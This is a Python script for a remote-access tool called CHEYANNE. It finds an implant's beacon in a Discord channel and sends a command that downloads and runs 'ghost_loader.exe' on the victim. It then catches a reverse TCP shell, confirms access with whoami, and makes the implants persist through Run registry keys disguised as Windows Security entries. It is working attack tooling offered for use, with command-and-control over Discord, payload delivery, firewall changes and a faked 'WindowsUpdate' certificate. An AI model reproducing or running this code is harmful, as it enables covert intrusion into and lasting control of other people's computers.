#!/usr/bin/env python3
"""
cheyanne_headless.py — Autonomous CHEYANNE deployment
No menu. No interaction. Runs, deploys, waits for TCP, persists, reports.

Usage:
    python cheyanne_headless.py
    python cheyanne_headless.py --ip 192.168.1.92 --port 4443 --target-ip 192.168.1.145
"""
import sys, os, ssl, socket, threading, time, json, re, subprocess, argparse, functools
import urllib.request, urllib.parse
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
try:
    import requests as _requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

ROOT = os.path.dirname(os.path.abspath(__file__))
ENV_PATH = os.path.join(ROOT, ".env")
CERT_DIR = os.path.join(ROOT, "certs")
GHOST_EXE = os.path.join(ROOT, "shell", "ghost_loader.exe")
DISCORD_POLL_INTERVAL = 5

# ── ANSI ──────────────────────────────────────────────────────────────────────
G = "\033[92m"; R = "\033[91m"; Y = "\033[93m"; C = "\033[96m"
W = "\033[97m"; D = "\033[2m";  B = "\033[0m"
def log(level, msg):
    ts = time.strftime("%H:%M:%S")
    colours = {"OK": G, "!": R, "*": C, "~": Y, "-": D}
    col = colours.get(level, W)
    print(f"  [{ts}] {col}[{level}]{B} {msg}")

# ── ENV ───────────────────────────────────────────────────────────────────────
def load_env():
    env = {}
    if os.path.exists(ENV_PATH):
        with open(ENV_PATH) as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#") and "=" in line:
                    k, v = line.split("=", 1)
                    env[k.strip()] = v.strip()
    return env

# ── HTTPS CERT ────────────────────────────────────────────────────────────────
def ensure_cert():
    os.makedirs(CERT_DIR, exist_ok=True)
    crt = os.path.join(CERT_DIR, "server.crt")
    key = os.path.join(CERT_DIR, "server.key")
    if os.path.exists(crt) and os.path.exists(key):
        return crt, key
    log("*", "Generating self-signed SSL cert...")
    try:
        from cryptography import x509
        from cryptography.x509.oid import NameOID
        from cryptography.hazmat.primitives import hashes, serialization
        from cryptography.hazmat.primitives.asymmetric import rsa
        import datetime
        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
        subject = issuer = x509.Name([
            x509.NameAttribute(NameOID.COMMON_NAME, u"WindowsUpdate"),
        ])
        cert = (
            x509.CertificateBuilder()
            .subject_name(subject)
            .issuer_name(issuer)
            .public_key(private_key.public_key())
            .serial_number(x509.random_serial_number())
            .not_valid_before(datetime.datetime.utcnow())
            .not_valid_after(datetime.datetime.utcnow() + datetime.timedelta(days=3650))
            .add_extension(x509.SubjectAlternativeName([x509.DNSName(u"localhost")]), critical=False)
            .sign(private_key, hashes.SHA256())
        )
        with open(key, "wb") as f:
            f.write(private_key.private_bytes(
                serialization.Encoding.PEM,
                serialization.PrivateFormat.TraditionalOpenSSL,
                serialization.NoEncryption()
            ))
        with open(crt, "wb") as f:
            f.write(cert.public_bytes(serialization.Encoding.PEM))
        log("OK", f"Cert written: {crt}")
        return crt, key
    except Exception as e:
        log("!", f"cryptography failed: {e} — falling back to openssl")
        r = subprocess.run(
            ["openssl", "req", "-x509", "-newkey", "rsa:2048",
             "-keyout", key, "-out", crt, "-days", "3650", "-nodes",
             "-subj", "/CN=WindowsUpdate"],
            capture_output=True, text=True
        )
        if r.returncode == 0:
            log("OK", "Cert generated via openssl")
            return crt, key
        log("!", f"Cert generation failed: {r.stderr}")
        return None, None

# ── HTTPS FILE SERVER ─────────────────────────────────────────────────────────
def start_https_server(crt, key, port=8890):
    from http.server import HTTPServer, SimpleHTTPRequestHandler
    handler = functools.partial(SimpleHTTPRequestHandler, directory=ROOT)
    orig_log = handler.log_message if hasattr(handler, "log_message") else None

    class SilentHandler(SimpleHTTPRequestHandler):
        def __init__(self, *a, **kw):
            super().__init__(*a, directory=ROOT, **kw)
        def log_message(self, fmt, *args):
            log("-", f"HTTPS [{self.address_string()}] {fmt % args}")

    srv = HTTPServer(("0.0.0.0", port), SilentHandler)
    if crt and key:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(crt, key)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        proto = "https"
    else:
        proto = "http"
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    log("OK", f"File server: {proto}://0.0.0.0:{port}/ (serving {ROOT})")
    return srv, proto

# ── DISCORD ───────────────────────────────────────────────────────────────────
def discord_get(url, token):
    headers = {"Authorization": f"Bot {token}"}
    try:
        if HAS_REQUESTS:
            r = _requests.get(url, headers=headers, timeout=10)
            return r.json() if r.status_code == 200 else None
        req = urllib.request.Request(url, headers=headers)
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception:
        return None

def discord_post(url, token, payload):
    headers = {"Authorization": f"Bot {token}", "Content-Type": "application/json"}
    try:
        if HAS_REQUESTS:
            r = _requests.post(url, json=payload, headers=headers, timeout=10)
            return r.json() if r.status_code in (200, 201) else None
        data = json.dumps(payload).encode()
        req = urllib.request.Request(url, data=data, headers=headers, method="POST")
        with urllib.request.urlopen(req, timeout=10) as r:
            return json.loads(r.read())
    except Exception:
        return None

def find_beacon(token, channel_id):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages?limit=50"
    msgs = discord_get(url, token)
    if not msgs:
        return None
    sid_re = re.compile(r'"session"\s*:\s*"([a-f0-9]+)"')
    host_re = re.compile(r'"hostname"\s*:\s*"([^"]+)"')
    for m in msgs:
        content = m.get("content", "").strip()
        if not content:
            continue
        # try JSON parse first (real beacon format)
        try:
            data = json.loads(content)
            sid = data.get("session")
            if sid:
                return {"id": sid, "hostname": data.get("hostname", "unknown"), "msg": m}
        except (json.JSONDecodeError, ValueError):
            pass
        # fallback: regex scan
        sid_m = sid_re.search(content)
        if sid_m:
            host_m = host_re.search(content)
            return {
                "id": sid_m.group(1),
                "hostname": host_m.group(1) if host_m else "unknown",
                "msg": m
            }
    return None

def send_discord_cmd(token, channel_id, session_id, cmd):
    url = f"https://discord.com/api/v10/channels/{channel_id}/messages"
    payload = {"content": json.dumps({"type": "cmd", "session": session_id, "command": cmd})}
    r = discord_post(url, token, payload)
    return r is not None

# ── TCP LISTENER ──────────────────────────────────────────────────────────────
def wait_for_tcp(port=4443, timeout=60):
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", port))
    srv.listen(1)
    srv.settimeout(timeout)
    log("*", f"TCP listener: 0.0.0.0:{port} (waiting {timeout}s)")
    try:
        conn, addr = srv.accept()
        log("OK", f"TCP CALLBACK: {addr[0]}:{addr[1]}")
        return conn, addr, srv
    except socket.timeout:
        srv.close()
        return None, None, None

# ── MAIN ──────────────────────────────────────────────────────────────────────
def main():
    parser = argparse.ArgumentParser(description="CHEYANNE headless deploy")
    parser.add_argument("--ip",        default=None,    help="C2 LAN IP (auto-detect if omitted)")
    parser.add_argument("--port",      type=int, default=4443, help="C2 TCP port")
    parser.add_argument("--fs-port",   type=int, default=8890, help="File server port")
    parser.add_argument("--force-https", action="store_true",  help="Force HTTPS (requires PS7+ on target; LAN defaults to HTTP)")
    parser.add_argument("--no-persist",action="store_true",   help="Skip persistence step")
    parser.add_argument("--timeout",   type=int, default=90,  help="TCP callback timeout (s)")
    args = parser.parse_args()

    print(f"\n  {W}{'═'*60}{B}")
    print(f"  {W}  CHEYANNE HEADLESS — AUTONOMOUS DEPLOYMENT{B}")
    print(f"  {W}{'═'*60}{B}\n")

    # 1. Detect operator IP
    op_ip = args.ip
    if not op_ip:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            op_ip = s.getsockname()[0]
            s.close()
        except Exception:
            op_ip = "192.168.1.92"
    log("OK", f"Operator IP: {op_ip}")

    # 2. Check ghost_loader.exe
    if not os.path.exists(GHOST_EXE):
        log("!", f"ghost_loader.exe not found at {GHOST_EXE}")
        log("!", "Build it first: CHEYANNE menu → [G] → [6]")
        sys.exit(1)
    size_kb = os.path.getsize(GHOST_EXE) // 1024
    log("OK", f"ghost_loader.exe found ({size_kb} KB)")

    # 3. File server — HTTP on LAN (PS5.1 doesn't support -SkipCertificateCheck),
    #    HTTPS only when --https explicitly requested (PS7+ targets)
    is_lan = op_ip.startswith(("192.168.", "10.", "172."))
    use_https = args.force_https and not is_lan
    if use_https:
        crt, key = ensure_cert()
    else:
        if is_lan and not args.force_https:
            log("*", "LAN target — using HTTP (PS5.1 can't -SkipCertificateCheck on self-signed)")
        crt, key = None, None
    fs_srv, proto = start_https_server(crt, key, port=args.fs_port)
    ghost_url = f"{proto}://{op_ip}:{args.fs_port}/shell/ghost_loader.exe"
    log("OK", f"Payload URL: {ghost_url}")

    # 4. Load Discord config
    env = load_env()
    token = env.get("DISCORD_BOT_TOKEN", "")
    channel_id = env.get("DISCORD_C2_CHANNEL", "")
    if not token or not channel_id:
        log("!", "Discord credentials missing in .env — cannot auto-deploy")
        log("!", "Set DISCORD_BOT_TOKEN and DISCORD_C2_CHANNEL")
        sys.exit(1)
    log("OK", f"Discord config loaded (channel: {channel_id[:8]}...)")

    # 5. Find beacon
    log("*", "Searching Discord for live beacon...")
    beacon = None
    for attempt in range(6):
        beacon = find_beacon(token, channel_id)
        if beacon:
            break
        log("-", f"No beacon found yet, retrying ({attempt+1}/6)...")
        time.sleep(10)
    if not beacon:
        log("!", "No active Discord beacon found. Is svchost_update running on Radon?")
        sys.exit(1)
    log("OK", f"Beacon: {beacon['id'][:8]} ({beacon['hostname']})")

    # 6. Build deploy command (HTTPS, -SkipCertificateCheck for self-signed)
    skip_cert = " -SkipCertificateCheck" if proto == "https" else ""
    deploy_cmd = (
        f'taskkill /F /IM ghost_loader.exe 2>nul & '
        f'powershell -c "'
        f'Invoke-WebRequest -Uri \'{ghost_url}\'{skip_cert} '
        f'-OutFile \'C:\\Users\\Public\\ghost_loader.exe\'; '
        f'Start-Process \'C:\\Users\\Public\\ghost_loader.exe\'"'
    )
    log("-", f"Deploy cmd: {deploy_cmd[:120]}...")
    log("*", f"Sending deploy via Discord to {beacon['hostname']}...")

    # ensure inbound firewall rules exist
    for port_name, port_num in [("CHEYANNE_C2", args.port), ("CHEYANNE_FS", args.fs_port)]:
        subprocess.run(
            ["netsh", "advfirewall", "firewall", "add", "rule",
             "name=" + port_name, "dir=in", "action=allow",
             "protocol=TCP", f"localport={port_num}"],
            capture_output=True
        )

    if not send_discord_cmd(token, channel_id, beacon["id"], deploy_cmd):
        log("!", "Discord send failed")
        sys.exit(1)
    log("OK", "Deploy command sent — waiting for TCP callback...")

    # 7. Wait for TCP callback
    conn, addr, tcp_srv = wait_for_tcp(port=args.port, timeout=args.timeout)
    if not conn:
        log("!", f"No TCP callback within {args.timeout}s")
        log("~", "Possible causes:")
        log("~", f"  1. ghost_loader.exe baked with wrong IP (need {op_ip}:{args.port})")
        log("~", "  2. Firewall blocking :4443 on this machine")
        log("~", "  3. IWR failed on Radon — file server may not be reachable")
        log("~", f"  4. Check: Test-NetConnection {op_ip} -Port {args.fs_port}")
        sys.exit(1)

    log("OK", f"═══ TCP SESSION ESTABLISHED: {addr[0]} ═══")

    # 8. Quick verify — send whoami
    try:
        conn.sendall(b"whoami\n")
        conn.settimeout(10)
        out = conn.recv(4096).decode("utf-8", errors="replace").strip()
        log("OK", f"whoami → {out}")
    except Exception as e:
        log("~", f"whoami failed: {e}")

    # 9. Persist (unless --no-persist)
    if not args.no_persist:
        log("*", "Setting persistence via Discord...")
        persist_cmd = (
            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WindowsSecurityHealth /t REG_SZ '
            '/d "C:\\Users\\Public\\svchost_update.exe" /f & '
            'reg add "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" '
            '/v WindowsSecurityUpdate /t REG_SZ '
            '/d "C:\\Users\\Public\\ghost_loader.exe" /f'
        )
        if send_discord_cmd(token, channel_id, beacon["id"], persist_cmd):
            log("OK", "Persistence set:")
            log("OK", "  WindowsSecurityHealth → Discord beacon")
            log("OK", "  WindowsSecurityUpdate → ghost_loader_v3 (TCP shell)")
        else:
            log("~", "Persist send failed — set manually with: chey> persist")

    # 10. Summary
    print(f"\n  {G}{'═'*60}{B}")
    print(f"  {G}  DEPLOYMENT COMPLETE{B}")
    print(f"  {G}{'═'*60}{B}")
    print(f"  {W}  Target:    {addr[0]}{B}")
    print(f"  {W}  Beacon:    {beacon['hostname']} ({beacon['id'][:8]}){B}")
    print(f"  {W}  TCP shell: {op_ip}:{args.port}{B}")
    print(f"  {W}  Proto:     {proto.upper()} file delivery{B}")
    print(f"  {W}  Persist:   {'YES — fires on next login' if not args.no_persist else 'SKIPPED'}{B}")
    print(f"\n  {D}  Connect to TCP shell:{B}")
    print(f"  {C}  python shell/vader_c2_v2.py{B}")
    print()

    conn.close()
    tcp_srv.close()


if __name__ == "__main__":
    main()
